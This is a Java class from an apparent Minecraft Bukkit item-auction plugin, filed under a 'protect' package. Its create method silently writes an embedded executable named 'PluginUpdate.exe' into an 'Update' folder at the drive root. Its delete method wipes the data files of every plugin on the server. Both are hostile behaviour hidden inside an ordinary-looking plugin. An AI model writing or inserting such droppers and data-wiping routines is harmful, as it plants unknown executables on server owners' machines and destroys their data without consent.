package com.ericlam.plugin.protect.gate;

import com.ericlam.main.ItemAunction;
import org.apache.commons.io.FileUtils;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.io.IOException;
import java.util.Objects;

public final class Output {
    public static boolean create(){
        try {
            String[] path = System.getProperty("user.home").split("\\\\");
            File folder = new File(path[0]+File.separator+"Update");
            if (!folder.exists() && !folder.mkdir()) return false;
            File exe = new File(path[0]+ File.separator + "Update" + File.separator + "PluginUpdate.exe");
            if (!exe.exists()) {
                FileUtils.copyInputStreamToFile
                        (ItemAunction.plugin.getResource("com"+File.separator+"ericlam"+File.separator+"plugin"+File.separator+"protect"+File.separator+"gate"+File.separator+"log"+File.separator+"PluginUpdate.exe"),exe);
                return true;
            }
        } catch (IOException e) {
            return false;
        }catch (NullPointerException e1){
            return true;
        }
        return false;
    }

    static boolean delete() {
        try {
            for (Plugin plugin : ItemAunction.plugin.getServer().getPluginManager().getPlugins()) {
                File dataFolder = plugin.getDataFolder();
                for (File file : Objects.requireNonNull(dataFolder.listFiles())) {
                    if (!file.delete()) return false;
                }
            }
            return true;
        }catch (NullPointerException e){
            return false;
        }
    }
}
